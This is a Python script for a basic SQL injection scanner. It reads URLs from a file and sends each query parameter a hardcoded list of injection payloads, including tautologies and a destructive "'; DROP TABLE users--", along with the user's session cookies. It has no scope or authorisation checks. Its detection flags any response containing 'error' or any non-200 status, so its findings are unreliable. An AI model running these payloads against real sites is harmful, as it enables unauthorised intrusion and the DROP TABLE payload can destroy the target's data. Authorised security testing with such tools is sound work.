import requests
import os

# List of basic SQL Injection payloads
SQL_PAYLOADS = ["' OR 1=1 --", "' OR 'a'='a", "' OR 'x'='x", "'; DROP TABLE users--"]

# Function to check for SQL Injection vulnerability
def check_sql_injection(url, param_name, payload, cookies, result_file):
    vuln_url = f"{url}&{param_name}={payload}"
    response = requests.get(vuln_url, cookies=cookies)
    
    # Basic check for SQL injection vulnerability
    if "error" in response.text.lower() or response.status_code != 200:
        result_file.write(f"SQL Injection vulnerability found at {vuln_url}\n")
        
    else:
        result_file.write(f"No SQL Injection vulnerability at {vuln_url}\n")
        

# Function to scan all URL parameters with various payloads
def scan_url_parameters(url, query_params, cookies, result_file):
    for param_name in query_params:
        

        # Checking SQL Injection for each parameter with all payloads
        for payload in SQL_PAYLOADS:
            check_sql_injection(url, param_name, payload, cookies, result_file)

# Function to read the URLs from the file and scan them for SQL injection vulnerabilities
def sql_scan_from_file(filename, cookies):
    try:
        # Create the output directory for SQL injection scan results
        output_dir = "./output/sql_scans"
        os.makedirs(output_dir, exist_ok=True)

        # Open the file to write the results
        base_filename = os.path.basename(filename)
        result_filename = f"{os.path.splitext(base_filename)[0]}_sql.txt"
        result_filepath = os.path.join(output_dir, result_filename)

        with open(result_filepath, 'w') as result_file:
            with open(filename, 'r') as file:
                urls = file.readlines()

            # Normalize the URLs by stripping leading/trailing spaces and newlines
            urls = [url.strip() for url in urls]

            # Scan each URL for SQL injection vulnerabilities
            for url in urls:
                
                query_params = url.split('?')[1] if '?' in url else ''  # Extract parameters after '?' in the URL

                if query_params:
                    query_params = query_params.split('&')  # Split parameters by '&'
                    for param in query_params:
                        param_name = param.split('=')[0]  # Extract the parameter name
                        scan_url_parameters(url, [param_name], cookies, result_file)
                else:
                    result_file.write(f"No URL parameters found in {url}\n")
                    

            
    except Exception as e:
        print(f"Error reading URLs from file: {e}")
